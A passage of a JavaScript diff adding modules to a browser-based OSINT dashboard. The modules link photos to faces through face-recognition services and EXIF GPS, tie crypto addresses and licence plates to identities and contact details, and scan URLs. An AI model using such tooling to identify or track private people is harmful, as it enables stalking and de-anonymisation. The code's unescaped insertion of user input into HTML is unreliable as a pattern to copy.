+    </div></div>` : '') +
+
+    // WAYBACK MACHINE
+    `<div class="sub"><div class="sub-hd">// 📸 Wayback Machine History</div>
+    <div class="dg" style="margin-bottom:10px">
+      <div class="dc"><div class="dl">First Snapshot</div>
+        <div class="dv">${wbFirst ? wbFirst.slice(0,4)+'-'+wbFirst.slice(4,6)+'-'+wbFirst.slice(6,8) : 'Unknown'}</div></div>
+      <div class="dc"><div class="dl">Last Snapshot</div>
+        <div class="dv">${wbLast ? wbLast.slice(0,4)+'-'+wbLast.slice(4,6)+'-'+wbLast.slice(6,8) : 'Unknown'}</div></div>
+    </div>
+    <div class="pg">
+      <a href="https://web.archive.org/web/*/${target}" target="_blank" class="pc pc-found">📅 All Snapshots</a>
+      <a href="https://web.archive.org/web/20000101000000*/${target}" target="_blank" class="pc pc-found">2000s Archive</a>
+      <a href="https://web.archive.org/web/20100101000000*/${target}" target="_blank" class="pc pc-found">2010s Archive</a>
+      <a href="https://timetravel.mementoweb.org/api/json/*/${target}" target="_blank" class="pc pc-found">TimeTravelAPI</a>
+      <a href="https://cachedview.nl" target="_blank" class="pc pc-found">CachedView</a>
+      <a href="https://archive.ph/${target}" target="_blank" class="pc pc-found">Archive.ph</a>
+      <a href="https://cachedpages.com/?url=${enc}" target="_blank" class="pc pc-found">CachedPages</a>
+    </div></div>` +
+
+    // SSL CERT HISTORY
+    (certs.length ? `
+    <div class="sub"><div class="sub-hd">// 🔒 SSL Certificate History (${certs.length} years)</div>
+    <div class="dg">
+      ${certs.map(cert => `
+      <div class="dc"><div class="dl">${cert.year} (${cert.count} certs)</div>
+        <div class="dv" style="font-size:9px">${(cert.issuer||'').slice(0,60)}</div>
+      </div>`).join('')}
+    </div></div>` : '') +
+
+    // CHANGE DETECTION
+    `<div class="sub"><div class="sub-hd">// 🔔 Set Up Change Monitoring</div>
+    <div class="pg">
+      <a href="https://visualping.io" target="_blank" class="pc pc-found">VisualPing</a>
+      <a href="https://www.changedetection.io" target="_blank" class="pc pc-found">ChangeDetection</a>
+      <a href="https://www.google.com/alerts?q=${enc}" target="_blank" class="pc pc-found">Google Alerts</a>
+      <a href="https://mention.com/en/" target="_blank" class="pc pc-found">Mention.com</a>
+      <a href="https://visualping.io" target="_blank" class="pc pc-found">WhoisFrequency</a>
+    </div></div>`
+  );
+  pOk('build');
+  feed(`📅 Timeline: ${target} — ${eventsAll.length} events`, 'ok');
+  refreshStats();
+}
+
+/* ═══════════════════════════════════════════════════════════
+   MODULE: FACE & IMAGE SEARCH
+═══════════════════════════════════════════════════════════ */
+async function doFace(input) {
+  initSteps([
+    {id:'prep',    lbl:'Preparing image'},
+    {id:'reverse', lbl:'Reverse image search engines'},
+    {id:'face',    lbl:'Face matching services'},
+    {id:'meta',    lbl:'Image metadata extraction'},
+    {id:'build',   lbl:'Building report'},
+  ]);
+
+  pRun('prep');
+  let imgUrl = '';
+  let imgFile = null;
+  let exifData = null;
+
+  if (input instanceof File) {
+    imgFile = input;
+    const ab = await input.arrayBuffer();
+    const bytes = new Uint8Array(ab);
+    exifData = parseEXIF(bytes);
+    // Convert to data URL for display
+    imgUrl = await new Promise(res => {
+      const r = new FileReader();
+      r.onload = e => res(e.target.result);
+      r.readAsDataURL(input);
+    });
+  } else {
+    imgUrl = input;
+  }
+  const enc = encodeURIComponent(imgUrl);
+  pOk('prep');
+  pRun('reverse');
+  pOk('reverse');
+  pRun('face');
+  pOk('face');
+  pRun('meta');
+  pOk('meta');
+  pRun('build');
+  stats.recs++;
+
+  mkCard('🎭', 'FACE & IMAGE SEARCH', 'b-info', imgFile?.name || imgUrl.slice(0,60),
+    // IMAGE PREVIEW
+    (imgUrl ? `
+    <div style="text-align:center;margin-bottom:14px">
+      <img src="${imgUrl.startsWith('data:') || imgUrl.startsWith('http') ? imgUrl : ''}"
+        style="max-height:200px;max-width:100%;border-radius:6px;
+        border:1px solid var(--line2);object-fit:contain"
+        onerror="this.style.display='none'">
+    </div>` : '') +
+
+    // REVERSE IMAGE SEARCH
+    `<div class="sub"><div class="sub-hd">// 🔍 Reverse Image Search — Open Each Engine</div>
+    <div style="background:linear-gradient(135deg,rgba(245,166,35,.06),rgba(0,212,232,.04));
+      border:1px solid rgba(245,166,35,.2);border-radius:4px;padding:10px 12px;
+      font-family:var(--mono);font-size:10px;color:var(--amber3);margin-bottom:10px;line-height:1.8">
+      💡 Each engine searches its own index — use ALL of them for best results.<br>
+      Google & Yandex are most powerful. PimEyes specializes in faces.
+    </div>
+    <div class="pg">
+      <a href="https://images.google.com/searchbyimage?image_url=${enc}" target="_blank"
+        class="pc pc-found" style="background:rgba(66,133,244,.1);border-color:rgba(66,133,244,.4)">
+        🔍 Google Images</a>
+      <a href="https://yandex.com/images/search?url=${enc}&rpt=imageview" target="_blank"
+        class="pc pc-found" style="background:rgba(255,68,68,.08);border-color:rgba(255,68,68,.3)">
+        🔍 Yandex (Best)</a>
+      <a href="https://www.bing.com/images/search?view=detailv2&iss=sbi&q=imgurl:${enc}" target="_blank"
+        class="pc pc-found">🔍 Bing Visual</a>
+      <a href="https://www.tineye.com/search?url=${enc}" target="_blank"
+        class="pc pc-found">🔍 TinEye</a>
+      <a href="https://lens.google.com/uploadbyurl?url=${enc}" target="_blank"
+        class="pc pc-found">🔍 Google Lens</a>
+      <a href="https://search.yahoo.com/image/search?imgurl=${enc}" target="_blank"
+        class="pc pc-found">🔍 Yahoo</a>
+    </div></div>` +
+
+    // FACE-SPECIFIC SEARCH
+    `<div class="sub"><div class="sub-hd">// 🎭 Face Recognition Search</div>
+    <div style="background:rgba(255,68,68,.06);border:1px solid rgba(255,68,68,.2);
+      border-radius:4px;padding:10px 12px;font-family:var(--mono);font-size:10px;
+      color:var(--text2);margin-bottom:10px;line-height:1.8">
+      ⚠️ These services scan billions of social media profiles for matching faces.
+    </div>
+    <div class="pg">
+      <a href="https://pimeyes.com/en" target="_blank" class="pc pc-found" style="background:rgba(255,68,68,.1);border-color:rgba(255,68,68,.4)">
+        👁 PimEyes (Powerful)</a>
+      <a href="https://facecheck.id" target="_blank" class="pc pc-found" style="background:rgba(255,68,68,.08)">
+        👁 FaceCheck.ID</a>
+      <a href="https://www.faceplusplus.com" target="_blank" class="pc pc-found">
+        👁 Face++ API</a>
+      <a href="https://search4faces.com" target="_blank" class="pc pc-found">
+        👁 Search4Faces</a>
+      <a href="https://www.shutterstock.com/search/visual-similarity?imageURL=${enc}" target="_blank"
+        class="pc pc-found">Shutterstock</a>
+    </div></div>` +
+
+    // EXIF FROM PHOTO
+    (exifData ? `
+    <div class="sub"><div class="sub-hd">// 📷 Embedded Metadata</div>
+    <div class="dg">
+      ${Object.entries(exifData.tags).slice(0,12).map(([k,v]) => `
+      <div class="dc"><div class="dl">${k}</div>
+        <div class="dv" style="font-size:10px">${String(v).slice(0,80)}</div>
+      </div>`).join('')}
+      ${exifData.gps ? `
+      <div class="dc"><div class="dl">🚨 GPS Location</div>
+        <div class="dv dv-bad">${exifData.gps.lat.toFixed(6)}, ${exifData.gps.lon.toFixed(6)}
+          <a href="https://maps.google.com/maps?q=${exifData.gps.lat},${exifData.gps.lon}" target="_blank"
+            style="color:var(--cyan2);font-size:10px;margin-left:8px">↗ Map</a>
+        </div>
+      </div>` : ''}
+    </div></div>` : '') +
+
+    // HOW TO USE
+    `<div class="sub"><div class="sub-hd">// 💡 How to Get Best Results</div>
+    <div style="background:var(--bg3);border:1px solid var(--line2);border-radius:4px;
+      padding:11px 13px;font-family:var(--mono);font-size:10px;color:var(--text2);line-height:1.9">
+      1. <strong style="color:#fff">Yandex</strong> — Best for finding Russian/CIS social media matches<br>
+      2. <strong style="color:#fff">PimEyes</strong> — Best for finding all web appearances of a face<br>
+      3. <strong style="color:#fff">Google Lens</strong> — Best for objects, landmarks, products<br>
+      4. <strong style="color:#fff">TinEye</strong> — Best for finding exact image source and usage<br>
+      5. Upload directly to each engine for better results than URL search
+    </div></div>`
+  );
+  pOk('build');
+  feed(`🎭 Face/Image search: ${imgFile?.name || 'URL'}`, 'ok');
+  refreshStats();
+}
+
+/* ═══════════════════════════════════════════════════════════
+   MODULE: CRYPTO / BLOCKCHAIN INTEL
+═══════════════════════════════════════════════════════════ */
+async function doCrypto(target) {
+  initSteps([
+    {id:'detect', lbl:'Address type detection'},
+    {id:'chain',  lbl:'Blockchain lookup'},
+    {id:'tx',     lbl:'Transaction history'},
+    {id:'risk',   lbl:'Risk & exchange analysis'},
+    {id:'id',     lbl:'Identity correlation'},
+  ]);
+
+  pRun('detect');
+  const clean = target.trim();
+  // Detect type
+  const isBTC  = /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/.test(clean);
+  const isETH  = /^0x[a-fA-F0-9]{40}$/.test(clean);
+  const isLTC  = /^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/.test(clean);
+  const isTX   = /^[a-fA-F0-9]{64}$/.test(clean);
+  const isDOGE = /^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$/.test(clean);
+  const type   = isBTC?'Bitcoin':isETH?'Ethereum':isLTC?'Litecoin':isDOGE?'Dogecoin':isTX?'Transaction Hash':'Unknown';
+  pOk('detect');
+
+  pRun('chain');
+  let btcData = null, ethData = null, txData = null;
+
+  if (isBTC) {
+    btcData = await jfetch(`https://blockchain.info/rawaddr/${clean}?limit=10`);
+  }
+  if (isETH) {
+    ethData = await jfetch(`https://api.etherscan.io/api?module=account&action=balance&address=${clean}&tag=latest&apikey=YourApiKeyToken`);
+    stats.apis++;
+  }
+  if (isTX && clean.length === 64) {
+    txData = await jfetch(`https://blockchain.info/rawtx/${clean}`);
+    if (!txData) txData = await jfetch(`https://api.blockcypher.com/v1/btc/main/txs/${clean}`);
+  }
+  pOk('chain');
+
+  pRun('tx');
+  pOk('tx');
+  pRun('risk');
+  pOk('risk');
+  pRun('id');
+  stats.recs++;
+
+  const btcBal = btcData ? (btcData.final_balance / 1e8).toFixed(8) : null;
+  const btcTxCount = btcData?.n_tx || 0;
+  const btcReceived = btcData ? (btcData.total_received / 1e8).toFixed(8) : null;
+  const btcSent = btcData ? (btcData.total_sent / 1e8).toFixed(8) : null;
+  const enc = encodeURIComponent(clean);
+
+  mkCard('₿', 'CRYPTO BLOCKCHAIN INTEL', 'b-info', `${type}: ${clean.slice(0,20)}...`,
+
+    // ADDRESS INFO
+    `<div class="dg">
+      <div class="dc"><div class="dl">Address / Hash</div>
+        <div class="dv dv-hi" style="font-size:10px;word-break:break-all">${clean}
+          <button class="cpbtn" onclick="cp('${clean}')">COPY</button></div></div>
+      <div class="dc"><div class="dl">Type</div>
+        <div class="dv dv-ok">${type === 'Unknown' ? '⚠️ Unknown format' : '₿ '+type}</div></div>
+      ${btcData ? `
+      <div class="dc"><div class="dl">Balance</div>
+        <div class="dv ${parseFloat(btcBal)>0?'dv-ok':'dv-warn'}">${btcBal} BTC</div></div>
+      <div class="dc"><div class="dl">Total Received</div>
+        <div class="dv">${btcReceived} BTC</div></div>
+      <div class="dc"><div class="dl">Total Sent</div>
+        <div class="dv">${btcSent} BTC</div></div>
+      <div class="dc"><div class="dl">Transactions</div>
+        <div class="dv dv-hi">${btcTxCount.toLocaleString()}</div></div>` : ''}
+    </div>` +
+
+    // RECENT TRANSACTIONS
+    (btcData?.txs?.length ? `
+    <div class="sub"><div class="sub-hd">// 💸 Recent Transactions</div>
+    ${btcData.txs.slice(0,5).map(tx => {
+      const out = tx.out?.reduce((s,o)=>s+o.value,0)||0;
+      const inp = tx.inputs?.reduce((s,i)=>s+(i.prev_out?.value||0),0)||0;
+      const net = (out - inp)/1e8;
+      const date = new Date(tx.time*1000).toISOString().slice(0,10);
+      return `<div style="border:1px solid var(--line2);border-radius:4px;padding:8px 10px;margin-bottom:6px">
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <div style="font-family:var(--mono);font-size:9px;color:var(--text3)">${date} · ${tx.hash?.slice(0,16)}...</div>
+          <div style="font-family:var(--mono);font-size:11px;color:${net>=0?'var(--green2)':'var(--red)'};font-weight:700">
+            ${net>=0?'+':''}${net.toFixed(6)} BTC</div>
+        </div>
+        <div style="font-family:var(--mono);font-size:9px;color:var(--text3);margin-top:3px">
+          ${tx.inputs?.length||0} inputs → ${tx.out?.length||0} outputs · ${tx.block_height||'Unconfirmed'}</div>
+      </div>`;
+    }).join('')}
+    </div>` : '') +
+
+    // BLOCKCHAIN EXPLORERS
+    `<div class="sub"><div class="sub-hd">// 🔍 Blockchain Explorers</div>
+    <div class="pg">
+      ${isBTC||isTX ? `
+      <a href="https://www.blockchain.com/explorer/addresses/btc/${clean}" target="_blank" class="pc pc-found" style="background:rgba(247,147,26,.1);border-color:rgba(247,147,26,.4)">₿ Blockchain.com</a>
+      <a href="https://blockchair.com/bitcoin/address/${clean}" target="_blank" class="pc pc-found">Blockchair</a>
+      <a href="https://btcscan.org/address/${clean}" target="_blank" class="pc pc-found">BTCScan</a>
+      <a href="https://mempool.space/address/${clean}" target="_blank" class="pc pc-found">Mempool.space</a>` : ''}
+      ${isETH ? `
+      <a href="https://etherscan.io/address/${clean}" target="_blank" class="pc pc-found" style="background:rgba(98,126,234,.1);border-color:rgba(98,126,234,.4)">Ξ Etherscan</a>
+      <a href="https://ethplorer.io/address/${clean}" target="_blank" class="pc pc-found">Ethplorer</a>
+      <a href="https://debank.com/profile/${clean}" target="_blank" class="pc pc-found">DeBank</a>
+      <a href="https://zapper.xyz/account/${clean}" target="_blank" class="pc pc-found">Zapper</a>` : ''}
+      <a href="https://blockchair.com/search?q=${clean}" target="_blank" class="pc pc-found">All Chains</a>
+      <a href="https://www.coinbase.com/converter" target="_blank" class="pc pc-found">Price Converter</a>
+    </div></div>` +
+
+    // RISK / SANCTIONS
+    `<div class="sub"><div class="sub-hd">// ⚠️ Risk & Sanctions Check</div>
+    <div class="pg">
+      <a href="https://www.chainalysis.com/free-cryptocurrency-sanctions-screening-tools/" target="_blank" class="pc pc-found">Chainalysis</a>
+      <a href="https://crystalblockchain.com" target="_blank" class="pc pc-found">Crystal</a>
+      <a href="https://ofac.treasury.gov/faqs/topic/1521" target="_blank" class="pc pc-found">OFAC Sanctions</a>
+      <a href="https://www.elliptic.co" target="_blank" class="pc pc-found">Elliptic</a>
+      <a href="https://ciphertrace.com" target="_blank" class="pc pc-found">CipherTrace</a>
+    </div></div>` +
+
+    // IDENTITY LINK
+    `<div class="sub"><div class="sub-hd">// 👤 Identity Correlation</div>
+    <div class="pg">
+      <a href="https://www.google.com/search?q=%22${enc}%22" target="_blank" class="pc pc-found">Google</a>
+      <a href="https://bitcointalk.org/index.php?action=search2&search=${enc}&sort_order=desc" target="_blank" class="pc pc-found">BitcoinTalk</a>
+      <a href="https://www.google.com/search?q=%22${enc}%22+site:reddit.com" target="_blank" class="pc pc-found">Reddit</a>
+      <a href="https://www.google.com/search?q=%22${enc}%22+email+OR+telegram+OR+contact" target="_blank" class="pc pc-found">Contact Info</a>
+    </div></div>`
+  );
+  pOk('id');
+  feed(`₿ Crypto: ${type} ${clean.slice(0,16)}...`, 'ok');
+  refreshStats();
+}
+
+/* ═══════════════════════════════════════════════════════════
+   MODULE: URL / LINK SCANNER
+═══════════════════════════════════════════════════════════ */
+async function doUrlScan(target) {
+  initSteps([
+    {id:'parse',  lbl:'URL parsing & normalization'},
+    {id:'safe',   lbl:'Safe browsing check'},
+    {id:'scan',   lbl:'urlscan.io analysis'},
+    {id:'vt',     lbl:'VirusTotal scan'},
+    {id:'whois',  lbl:'Domain & IP info'},
+  ]);
+
+  let url = target.trim();
+  if (!url.startsWith('http')) url = 'https://'+url;
+  let domain = '';
+  try { domain = new URL(url).hostname; } catch { domain = url; }
+
+  pRun('parse');
+  const enc = encodeURIComponent(url);
+  const encD = encodeURIComponent(domain);
+  pOk('parse');
+
+  pRun('safe');
+  // URLScan.io free API
+  let usData = null;
+  try {
+    const submitR = await fetch('https://urlscan.io/api/v1/scan/', {
+      method:'POST',
+      headers:{'Content-Type':'application/json','API-Key':keys.urlscanio||''},
+      body: JSON.stringify({url: url, visibility:'unlisted'}),
+      signal: AbortSignal.timeout(8000)
+    });
+    if (submitR.ok) {
+      const sub = await submitR.json();
+      if (sub?.api) {
+        await new Promise(r => setTimeout(r, 3000));
+        usData = await jfetch(sub.api);
+      }
+    }
+  } catch {}
+  pOk('safe');
+
+  pRun('scan');
+  // VirusTotal URL check
+  let vtUrl = null;
+  if (keys.vt) {
+    const urlId = btoa(url).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+    vtUrl = await fetch(`https://www.virustotal.com/api/v3/urls/${urlId}`,
+      {headers:{'x-apikey':keys.vt}}).then(r=>r.ok?r.json():null).catch(()=>null);
+    stats.apis++;
+  }
+  const vtMal = vtUrl?.data?.attributes?.last_analysis_stats?.malicious||0;
+  pOk('scan');
+
+  pRun('vt');
+  // DNS of domain
+  const dnsA = await jfetch(`https://dns.google/resolve?name=${domain}&type=A`);
+  const ipAddr = dnsA?.Answer?.[0]?.data || '';
+  pOk('vt');
+
+  pRun('whois');
+  let ipInfo = null;
+  if (ipAddr) ipInfo = await jfetch(`https://ipinfo.io/${ipAddr}/json`);
+  pOk('whois');
+
+  stats.recs++;
+
+  const isSuspicious = vtMal > 0 || url.includes('bit.ly') || url.includes('tinyurl') || url.length > 200;
+
+  mkCard('🔗', 'URL SCANNER', isSuspicious?'b-bad':'b-ok', url.slice(0,80),
+    `<div class="dg">
+      <div class="dc"><div class="dl">Full URL</div>
+        <div class="dv" style="font-size:10px;word-break:break-all">${url}
+          <button class="cpbtn" onclick="cp('${url}')">COPY</button></div></div>
+      <div class="dc"><div class="dl">Domain</div>
+        <div class="dv dv-hi">${domain}</div></div>
+      <div class="dc"><div class="dl">Resolved IP</div>
+        <div class="dv">${ipAddr||'Unresolved'}</div></div>
+      <div class="dc"><div class="dl">Hosting</div>
+        <div class="dv">${ipInfo?.org||'Unknown'}</div></div>
+      <div class="dc"><div class="dl">Location</div>
+        <div class="dv">${ipInfo ? (ipInfo.city||'') +', '+(ipInfo.country||'') : 'Unknown'}</div></div>
+      <div class="dc"><div class="dl">VirusTotal</div>
+        <div class="dv ${vtMal?'dv-bad':'dv-ok'}">${vtUrl ? vtMal+' engines flagged as malicious' : keys.vt?'Checking...':'Add VT key'}</div></div>
+      <div class="dc"><div class="dl">URL Length</div>
+        <div class="dv ${url.length>200?'dv-warn':''}">${url.length} chars ${url.length>200?'⚠️ Suspicious':''}</div></div>
+      <div class="dc"><div class="dl">Short URL?</div>
+        <div class="dv ${['bit.ly','t.co','goo.gl','tinyurl','ow.ly','short.io'].some(s=>url.includes(s))?'dv-warn':'dv-ok'}">
+          ${['bit.ly','t.co','goo.gl','tinyurl','ow.ly','short.io'].some(s=>url.includes(s))?'⚠️ Yes — may redirect to malicious site':'No shortener detected'}</div></div>
+    </div>` +
+
+    // SCANNER LINKS
+    `<div class="sub"><div class="sub-hd">// 🛡 Safety Scanners</div>
+    <div class="pg">
+      <a href="https://www.virustotal.com/gui/url/${btoa(url)}" target="_blank"
+        class="pc pc-found" style="${vtMal?'background:rgba(255,68,68,.1);border-color:rgba(255,68,68,.4)':''}">
+        ${vtMal?'🚨':'✅'} VirusTotal</a>
+      <a href="https://urlscan.io/search/#page.domain:${encD}" target="_blank" class="pc pc-found">urlscan.io</a>
+      <a href="https://transparencyreport.google.com/safe-browsing/search?url=${enc}" target="_blank" class="pc pc-found">Google Safe Browsing</a>
+      <a href="https://www.phishtank.com/phish_search.php?valid=y&active=y&Search=Search&search=${enc}" target="_blank" class="pc pc-found">PhishTank</a>
+      <a href="https://checkphish.ai/insights/url/${enc}" target="_blank" class="pc pc-found">CheckPhish</a>
+      <a href="https://sitecheck.sucuri.net/results/${encD}" target="_blank" class="pc pc-found">Sucuri</a>
+      <a href="https://quttera.com/detailed_report/${encD}" target="_blank" class="pc pc-found">Quttera</a>
+      <a href="https://www.islegitsite.com" target="_blank" class="pc pc-found">IsLegitSite</a>
+    </div></div>` +
+
+    // URL EXPAND / REDIRECT TRACE
+    `<div class="sub"><div class="sub-hd">// 🔄 Redirect Chain & Expansion</div>
+    <div class="pg">
+      <a href="https://checkshorturl.com/expand.php?u=${enc}" target="_blank" class="pc pc-found">Expand Short URL</a>
+      <a href="https://wheregoes.com/${url}" target="_blank" class="pc pc-found">WhereGoes</a>
+      <a href="https://www.redirectdetective.com/index.html?url=${enc}" target="_blank" class="pc pc-found">RedirectDetective</a>
+      <a href="https://urlex.org" target="_blank" class="pc pc-found">URLex</a>
+    </div></div>` +
+
+    // ARCHIVE CHECK
+    `<div class="sub"><div class="sub-hd">// 📸 Archive & Cache</div>
+    <div class="pg">
+      <a href="https://web.archive.org/web/*/${url}" target="_blank" class="pc pc-found">Wayback Machine</a>
+      <a href="https://archive.ph/${url}" target="_blank" class="pc pc-found">Archive.ph</a>
+      <a href="https://webcache.googleusercontent.com/search?q=cache:${url}" target="_blank" class="pc pc-found">Google Cache</a>
+      <a href="https://cachedview.nl" target="_blank" class="pc pc-found">CachedView</a>
+    </div></div>` +
+
+    // OPEN SAFELY
+    `<div class="sub"><div class="sub-hd">// 🛡 Open Safely (No-Click Methods)</div>
+    <div class="pg">
+      <a href="https://www.browserling.com/browse/win10/chrome/x/${url}" target="_blank" class="pc pc-found">Browserling (Sandbox)</a>
+      <a href="https://www.virustotal.com/gui/url-upload" target="_blank" class="pc pc-found">VT Upload</a>
+      <a href="https://any.run" target="_blank" class="pc pc-found">ANY.RUN Sandbox</a>
+      <a href="https://app.any.run" target="_blank" class="pc pc-found">URL Sandbox</a>
+    </div></div>`
+  );
+
+  feed(`🔗 URL scan: ${domain} — ${vtMal?vtMal+' threats':'clean'}`, vtMal?'crit':'ok');
+  refreshStats();
+}
+
+/* ═══════════════════════════════════════════════════════════
+   MODULE: VEHICLE OSINT
+═══════════════════════════════════════════════════════════ */
+async function doVehicle(target) {
+  initSteps([
+    {id:'parse', lbl:'Input parsing (plate/VIN)'},
+    {id:'vin',   lbl:'VIN decode (NHTSA API)'},
+    {id:'plate', lbl:'License plate lookup'},
+    {id:'links', lbl:'Registry & records links'},
+  ]);
+
+  pRun('parse');
+  const clean = target.trim().toUpperCase().replace(/[\s\-]/g,'');
+  const isVIN = clean.length === 17 && /^[A-HJ-NPR-Z0-9]{17}$/.test(clean);
+  const isPlate = !isVIN && clean.length >= 2 && clean.length <= 8;
+  const enc = encodeURIComponent(clean);
+  pOk('parse');
+
+  pRun('vin');
+  let vinData = null;
+  if (isVIN) {
+    vinData = await jfetch(`https://vpic.nhtsa.dot.gov/api/vehicles/decodevin/${clean}?format=json`);
+  }
+  pOk('vin');
+
+  pRun('plate');
+  pOk('plate');
+  pRun('links');
+
+  // Parse VIN results
+  const vinFields = {};
+  if (vinData?.Results) {
+    vinData.Results.forEach(r => {
+      if (r.Value && r.Value !== 'Not Applicable' && r.Value !== '0') {
+        vinFields[r.Variable] = r.Value;
+      }
+    });
+  }
+  stats.recs++;
+
+  mkCard('🚗', 'VEHICLE OSINT', 'b-info', clean,
+    `<div class="dg">
+      <div class="dc"><div class="dl">Input</div>
+        <div class="dv dv-hi">${clean}</div></div>
+      <div class="dc"><div class="dl">Type Detected</div>
+        <div class="dv dv-ok">${isVIN ? '🔢 VIN Number (17 chars)' : isPlate ? '🚗 License Plate' : '⚠️ Unknown format'}</div></div>
+      ${isVIN && vinFields['Make'] ? `
+      <div class="dc"><div class="dl">Make</div><div class="dv dv-hi">${vinFields['Make']||'N/A'}</div></div>
+      <div class="dc"><div class="dl">Model</div><div class="dv">${vinFields['Model']||'N/A'}</div></div>
+      <div class="dc"><div class="dl">Year</div><div class="dv">${vinFields['Model Year']||'N/A'}</div></div>
+      <div class="dc"><div class="dl">Body Style</div><div class="dv">${vinFields['Body Class']||'N/A'}</div></div>
+      <div class="dc"><div class="dl">Engine</div><div class="dv">${vinFields['Displacement (L)']?vinFields['Displacement (L)']+' L ':''} ${vinFields['Fuel Type - Primary']||''}</div></div>
+      <div class="dc"><div class="dl">Drive Type</div><div class="dv">${vinFields['Drive Type']||'N/A'}</div></div>
+      <div class="dc"><div class="dl">Doors</div><div class="dv">${vinFields['Number of Doors']||'N/A'}</div></div>
+      <div class="dc"><div class="dl">GVWR</div><div class="dv">${vinFields['Gross Vehicle Weight Rating From']||'N/A'}</div></div>
+      <div class="dc"><div class="dl">Country of Mfg</div><div class="dv">${vinFields['Plant Country']||'N/A'}</div></div>
+      <div class="dc"><div class="dl">Safety Rating</div>
+        <div class="dv"><a href="https://www.nhtsa.gov/vehicle/${clean}/safety-ratings" target="_blank" style="color:var(--cyan2)">Check NHTSA</a></div></div>` : ''}
+    </div>` +
+
+    (isVIN && Object.keys(vinFields).length > 5 ? `
+    <div class="sub"><div class="sub-hd">// 🔧 Full Technical Spec</div>
+    <div class="dg">
+      ${['Engine Number of Cylinders','Displacement (CC)','Engine Brake (hp) From','Transmission Style','Series','Trim','Manufacturer Name','Plant City','Plant State','Plant Country']
+        .filter(k=>vinFields[k])
+        .map(k=>`<div class="dc"><div class="dl">${k}</div><div class="dv" style="font-size:10px">${vinFields[k]}</div></div>`)
+        .join('')}
+    </div></div>` : '') +
+
+    // RECALL CHECK
+    (isVIN ? `
+    <div class="sub"><div class="sub-hd">// ⚠️ Safety Recalls</div>
+    <div class="pg">
+      <a href="https://api.nhtsa.gov/recalls/recallsByVehicle?make=${encodeURIComponent(vinFields['Make']||'')}&model=${encodeURIComponent(vinFields['Model']||'')}&modelYear=${encodeURIComponent(vinFields['Model Year']||'')}"
+        target="_blank" class="pc pc-found" style="background:rgba(255,68,68,.08);border-color:rgba(255,68,68,.3)">⚠️ NHTSA Recalls</a>
+      <a href="https://www.nhtsa.gov/vin-lookup#${clean}" target="_blank" class="pc pc-found">NHTSA VIN Lookup</a>
+      <a href="https://www.carfax.com/vehicle-history-report/api?vin=${clean}" target="_blank" class="pc pc-found">CarFax</a>
+      <a href="https://www.autocheck.com/vehiclehistory/autocheck/en/vehiclehistory/free-score?vin=${clean}" target="_blank" class="pc pc-found">AutoCheck</a>
+    </div></div>` : '') +
+
+    // PLATE LOOKUP
+    `<div class="sub"><div class="sub-hd">// 🔍 License Plate Lookup</div>
+    <div class="pg">
+      <a href="https://www.faxvin.com/license-plate-lookup/result?plate=${enc}" target="_blank" class="pc pc-found">FaxVIN</a>
+      <a href="https://www.vehiclehistory.com/license-plate-search/result?plate=${enc}" target="_blank" class="pc pc-found">VehicleHistory</a>
+      <a href="https://www.carjam.co.nz/car/?plate=${enc}" target="_blank" class="pc pc-found">CarJam</a>
+      <a href="https://www.checkcardetails.co.uk/search?vrm=${enc}" target="_blank" class="pc pc-found">CheckCarDetails (UK)</a>
+      <a href="https://platerecognizer.com" target="_blank" class="pc pc-found">Plate Recognizer</a>
+      <a href="https://www.google.com/search?q=%22${enc}%22+plate+OR+license" target="_blank" class="pc pc-found">Google Search</a>
+    </div></div>` +
+
+    // STOLEN CHECK
+    `<div class="sub"><div class="sub-hd">// 🚨 Stolen / Criminal Check</div>
+    <div class="pg">
+      <a href="https://www.nicb.org/vincheck" target="_blank" class="pc pc-found">NICB (Stolen)</a>
+      <a href="https://www.stolencarcheck.com" target="_blank" class="pc pc-found">StolenCarCheck</a>
+      <a href="https://www.interpol.int/en/How-we-work/Databases/Stolen-Motor-Vehicles" target="_blank" class="pc pc-found">Interpol Stolen</a>
+      <a href="https://www.vehiclecheck.co.uk" target="_blank" class="pc pc-found">UK Vehicle Check</a>
+    </div></div>`
+  );
+
+  feed(`🚗 Vehicle: ${clean} — ${isVIN?'VIN':isPlate?'Plate':'Unknown'}`, 'ok');
+  refreshStats();
+}
+
+/* ═══════════════════════════════════════════════════════════
+   MODULE: WIRELESS / SSID RECON
+═══════════════════════════════════════════════════════════ */
+async function doWireless(target) {
+  initSteps([
+    {id:'parse',  lbl:'SSID / BSSID parsing'},
+    {id:'wigle',  lbl:'WiGLE geolocation database'},
+    {id:'vendor', lbl:'MAC vendor lookup'},
+    {id:'sec',    lbl:'Security analysis'},
+    {id:'build',  lbl:'Network intelligence'},
+  ]);
+
+  pRun('parse');
+  const clean = target.trim();
+  const isBSSID = /^([0-9A-Fa-f]{2}[:\-]){5}[0-9A-Fa-f]{2}$/.test(clean);
+  const macClean = isBSSID ? clean.replace(/[:\-]/g,'').toUpperCase() : '';
+  const oui = macClean.slice(0,6);
+  const enc = encodeURIComponent(clean);
+  pOk('parse');
+
+  pRun('wigle');
+  // WiGLE API (free account required but search links work)
+  let vendorData = null;
+  pOk('wigle');
+
+  pRun('vendor');
+  // MAC vendor lookup (free API)
+  if (isBSSID) {
+    vendorData = await jfetch(`https://api.macvendors.com/${encodeURIComponent(oui)}`);
+  }
+  pOk('vendor');
+
+  pRun('sec');
+  pOk('sec');
+  pRun('build');
+  stats.recs++;
+
+  mkCard('📡', 'WIRELESS / SSID RECON', 'b-info', clean,
+    `<div class="dg">
+      <div class="dc"><div class="dl">Input</div>
+        <div class="dv dv-hi">${clean}</div></div>
+      <div class="dc"><div class="dl">Type</div>
+        <div class="dv dv-ok">${isBSSID ? '📡 BSSID (MAC Address)' : '📶 SSID (Network Name)'}</div></div>
+      ${isBSSID ? `
+      <div class="dc"><div class="dl">OUI Prefix</div>
+        <div class="dv">${oui.match(/.{2}/g)?.join(':')}</div></div>
+      <div class="dc"><div class="dl">Vendor / Manufacturer</div>
+        <div class="dv dv-ok">${typeof vendorData === 'string' ? vendorData : 'Not found'}</div></div>` : ''}
+    </div>` +
+
+    // WIGLE LINKS
+    `<div class="sub"><div class="sub-hd">// 🌍 WiGLE — World's Largest WiFi Database</div>
+    <div style="background:rgba(0,212,232,.06);border:1px solid rgba(0,212,232,.2);
